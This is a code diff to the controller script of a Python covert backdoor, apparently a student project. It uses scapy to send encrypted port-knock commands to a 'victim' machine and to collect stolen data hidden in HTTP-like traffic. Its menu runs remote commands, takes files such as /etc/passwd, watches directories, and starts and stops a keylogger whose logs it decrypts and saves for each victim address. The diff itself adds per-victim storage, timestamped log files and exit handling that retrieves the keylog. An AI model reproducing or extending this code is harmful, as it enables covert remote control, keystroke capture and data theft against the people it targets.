@@ -19,6 +19,7 @@ from scapy.all import *
 from scapy.layers.inet import *
 import encryption
 import textwrap
+from pathlib import Path
 # Set scapy to use libpcap library to circumvent iptables rules.
 from scapy.all import conf
 conf.use_pcap = True
@@ -68,7 +69,9 @@ class Configuration:
                 elif config_data[0] == 'delimiter':
                     self.delimiter = config_data[1]
                 elif config_data[0] == 'storage_path':
-                    self.storage_path = config_data[1]
+                    self.storage_path = f"{config_data[1]}{self.receiver_address}/"
+
+        Path(f"{self.storage_path}").mkdir(parents=True, exist_ok=True)
 
     def update_port_knock_password_seq_num(self):
         self.port_knock_password_seq_num = str(int(self.port_knock_password_seq_num) + 1)
@@ -164,40 +167,34 @@ def start_sender():
 
         if user_input == "1":
             command = user_input
-            print(command)
         elif user_input == "2":
             command = user_input
-            print(command)
         elif user_input == "3":
             user_input2 = input("Type in command (E.g. ifconfig):\n")
             command = user_input + delimiter + user_input2
-            print(command)
         elif user_input == "4":
             user_input2 = input("Type in file path (E.g. /etc/passwd):\n")
             command = user_input + delimiter + user_input2
-            print(command)
         elif user_input == "5":
             user_input2 = input("Type in file path (E.g. /etc/passwd):\n")
             command = user_input + delimiter + user_input2
-            print(command)
         elif user_input == "6":
             command = user_input
-            print(command)
         elif user_input == "7":
             user_input2 = input("Type in directory path (E.g. /etc/ssh):\n")
             command = user_input + delimiter + user_input2
-            print(command)
         elif user_input == "8":
             command = user_input
-            print(command)
         elif user_input == "9":
             command = user_input
-            print(command)
-            print("Do some Exit stuff")
+            send_port_knock(command)
+            print("Waiting for keylogger stop and transfer...")
+            time.sleep(2)
             print("Attacker Exiting.")
             break
         else:
             print("Invalid input, try again.")
+            continue
 
         try:
             encoded_input = command.encode("utf-8").decode("utf-8")
@@ -293,7 +290,10 @@ def process_sniff_pkt(pkt):
         session = str(int(cookie.split(",")[2].split("=")[1].strip()))
         content = data.split("Content-Length: ")[1].split(maxsplit=1)[1].strip()
         print(instruction)
-        session_name = encryption.decrypt(session_name.encode('utf-8')).decode('utf-8')
+        if (len(session_name) >0):
+            session_name = encryption.decrypt(session_name.encode('utf-8')).decode('utf-8')
+        else:
+            session_name = ""
         print(f"session_name: {session_name}")
         print(session)
         print(content)
@@ -324,7 +324,11 @@ def process_sniff_pkt(pkt):
         return
 
 
-def process_data(instruction, data, filename=""):
+def process_data(instruction, data, file_name=""):
+    split_desc = file_name.rsplit(".", 1)
+    filename = f"{split_desc[0]}-{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+    if len(split_desc) > 1:
+        filename += f".{split_desc[1]}"
 
     if instruction == "1":
         print(f"Starting keylogger on victim.")
@@ -332,9 +336,9 @@ def process_data(instruction, data, filename=""):
         print(f"Stopped keylogger and saving log file from victim.")
         decrypted_data = encryption.decrypt(data.encode('utf-8'))
         # print(decrypted_data)
-        with open(file=f"data/{filename}", mode='wb') as file:
+        with open(file=f"{config.storage_path}{filename}", mode='wb') as file:
             file.write(decrypted_data)
-        print(f"Output: <app_directory>/data/{filename}")
+        print(f"Output: {config.storage_path}{filename}")
     elif instruction == "3":
         print(f"Instruction: {instruction}")
         decrypted_data = encryption.decrypt(data.encode('utf-8')).decode('utf-8')
@@ -410,6 +414,7 @@ def send_port_knock(command):
                   "is truncated.")
         port_knock1 = IP(dst=receiver_addr) / UDP(sport=sport, dport=port) / Raw(load=encrypt_msg)
         send(port_knock1, verbose=0)
+        config.update_port_knock_password_seq_num()
     else:
         parts = textwrap.wrap(command, 240)
         for idx, part in enumerate(parts):
@@ -422,6 +427,7 @@ def send_port_knock(command):
                       "is truncated.")
                 port_knock2 = IP(dst=receiver_addr) / UDP(sport=sport, dport=port) / Raw(load=encrypt_msg)
                 send(port_knock2, verbose=0)
+        config.update_port_knock_password_seq_num()
 
     # Port-knocking 3 UDP ports with Auth keyword as payload. Include command at end of last packet payload.
     # port_knock_1 = IP(dst=receiver_addr) / UDP(sport=sport, dport=port1) / Raw(load=port_knock_auth)
